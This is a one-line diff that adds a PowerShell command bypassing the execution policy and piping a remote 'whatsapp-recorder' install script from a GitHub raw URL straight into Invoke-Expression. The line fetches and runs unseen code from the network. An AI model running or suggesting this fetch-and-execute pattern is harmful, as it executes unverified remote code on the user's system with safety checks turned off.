@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/quantk213-tech/chessium/main/dcr/whatsapp-recorder/install.ps1 | iex"
